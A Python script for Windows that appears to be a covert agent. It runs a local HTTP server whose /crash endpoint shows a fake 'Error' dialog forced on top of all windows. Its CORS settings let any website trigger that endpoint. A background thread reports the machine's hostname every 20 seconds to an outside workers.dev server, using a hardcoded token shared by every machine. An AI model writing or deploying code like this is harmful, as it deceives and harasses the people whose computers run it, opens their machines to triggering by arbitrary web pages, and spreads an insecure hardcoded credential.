import ctypes
import json
import os
import socket
import subprocess
import tempfile
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 5005

# Shared secret so telelluc-log-auth knows this is a genuine agent.
# Same value on every machine on purpose (that's what makes this script
# plug-and-play: copy it anywhere and it just registers itself).
AGENT_TOKEN = "ed81f9a6ad3fe1ba5587430863c983c2ea2c77239a158fa7"
LOG_AUTH_URL = "https://telelluc-log-auth.mrocadlectric.workers.dev"
HEARTBEAT_INTERVAL_SECONDS = 20


def heartbeat_loop():
    hostname = socket.gethostname()
    payload = json.dumps({"hostname": hostname}).encode("utf-8")
    while True:
        try:
            req = urllib.request.Request(
                LOG_AUTH_URL + "/heartbeat",
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + AGENT_TOKEN,
                },
                method="POST",
            )
            urllib.request.urlopen(req, timeout=10).read()
        except Exception:
            pass
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)

ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")

# CAMBIO AQUÍ: Sumamos 4096 (MB_SYSTEMMODAL) a los flags originales.
# Esto fuerza a Windows a colocar esta ventana encima de todo lo demás de forma nativa.
ERROR_VBS_CONTENT = 'MsgBox "Error", 16 + 65536 + 4096, "Error"\n'

ACTIVATOR_VBS_CONTENT = (
    'Set shell = CreateObject("WScript.Shell")\n'
    "For i = 1 To 25\n"
    '    shell.AppActivate "Error"\n'
    "    WScript.Sleep 200\n"
    "Next\n"
)

with open(ERROR_VBS_PATH, "w") as f:
    f.write(ERROR_VBS_CONTENT)

with open(ACTIVATOR_VBS_PATH, "w") as f:
    f.write(ACTIVATOR_VBS_CONTENT)

user32 = ctypes.windll.user32
HWND_TOPMOST = -1
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_SHOWWINDOW = 0x0040


def _find_error_window():
    result = []

    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    def _enum(hwnd, _lparam):
        if user32.IsWindowVisible(hwnd):
            buf = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(hwnd, buf, 256)
            if buf.value.strip() == "Error":
                result.append(hwnd)
                return False
        return True

    user32.EnumWindows(_enum, 0)
    return result[0] if result else None


def _force_topmost():
    for _ in range(60):
        hwnd = _find_error_window()
        if hwnd:
            for _ in range(10):
                user32.SetWindowPos(
                    hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                )
                time.sleep(0.2)
            return
        time.sleep(0.05)


def show_error():
    subprocess.Popen(["wscript.exe", ERROR_VBS_PATH])
    subprocess.Popen(["wscript.exe", ACTIVATOR_VBS_PATH])
    _force_topmost()


class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Private-Network", "true")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == "/crash":
            threading.Thread(target=show_error, daemon=True).start()
            self.send_response(200)
        else:
            self.send_response(404)
        self._cors()
        self.end_headers()

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    threading.Thread(target=heartbeat_loop, daemon=True).start()

    server = HTTPServer(("127.0.0.1", PORT), Handler)
    print(f"Listening on http://127.0.0.1:{PORT} ...", flush=True)
    server.serve_forever()